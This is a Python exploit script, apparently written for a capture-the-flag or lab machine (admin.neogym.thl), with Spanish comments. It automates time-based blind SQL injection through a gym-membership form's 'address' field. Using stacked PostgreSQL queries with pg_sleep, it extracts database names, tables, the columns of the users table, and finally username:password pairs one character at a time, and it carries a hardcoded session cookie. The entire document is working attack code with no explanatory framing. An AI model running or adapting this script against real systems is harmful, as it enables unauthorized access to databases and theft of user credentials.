import time
import string
import requests
from pwn import *

def send_payload(url, payload, cookies, p1):
    data = {
        'first_name': 'Prueba',
        'last_name': 'test',
        'email': 'test@mail.com',
        'phone': '123456789',
        'sex': 'M',
        'height': 186,
        'weight': 80,
        'membership_type': 'Mensual',
        'address': payload
    }
    p1.status(f"🔍 Probando: {payload}")
    res = requests.post(url, data=data, cookies=cookies)
    return res

def extract_info(url, cookies, query_template, max_positions, characters, p1, p2):
    extracted_info = ''
    for position in range(1, max_positions + 1):
        for character in characters:
            payload = query_template.format(position, character)
            res = send_payload(url, payload, cookies, p1)

            if res.elapsed.total_seconds() > 2:
                extracted_info += character
                p2.status(f"\033[92m{extracted_info}\033[0m")
                break
        else:
            # Si no se encontró ningún carácter para esa posición, se asume que terminó
            break
    return extracted_info

def get_databases():
    url = 'http://admin.neogym.thl/index.php'
    cookies = {"PHPSESSID": '7qsvceilupjqvaie18icnk87n9'}
    p1 = log.progress("🚀 Iniciando proceso de fuerza bruta")
    time.sleep(2)

    characters_basic = string.ascii_lowercase + string.digits + ','
    characters_extended = string.printable.replace(' ', '')

    # Bases de datos
    p2 = log.progress("📚 Bases de datos")
    query_template = "'); select case when substring(string_agg(datname,','),{},1)='{}' then pg_sleep(2) else pg_sleep(0) end from pg_database --"
    extract_info(url, cookies, query_template, 60, characters_basic, p1, p2)

    # Tablas
    p2 = log.progress("📋 Tablas")
    query_template = "'); select case when substring(string_agg(table_name,','),{},1)='{}' then pg_sleep(2) else pg_sleep(0) end from information_schema.tables where table_catalog='neogym'--"
    extract_info(url, cookies, query_template, 60, characters_basic, p1, p2)

    # Columnas
    p2 = log.progress("🗄️ Columnas")
    query_template = "'); select case when substring(string_agg(column_name,','),{},1)='{}' then pg_sleep(2) else pg_sleep(0) end from information_schema.columns where table_name='users' and table_catalog='neogym'--"
    extract_info(url, cookies, query_template, 60, characters_basic, p1, p2)

    # Usuarios y Contraseñas
    p2 = log.progress("🔐 Usuarios y Contraseñas")
    query_template = "'); SELECT CASE WHEN substring(string_agg(username || ':' || password,','),{},1)='{}' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--"
    extracted_info = extract_info(url, cookies, query_template, 100, characters_extended, p1, p2)

    print("\n[INFO EXTRAÍDA]")
    print(f"\033[92m{extracted_info}\033[0m")

if __name__ == '__main__':
    get_databases()
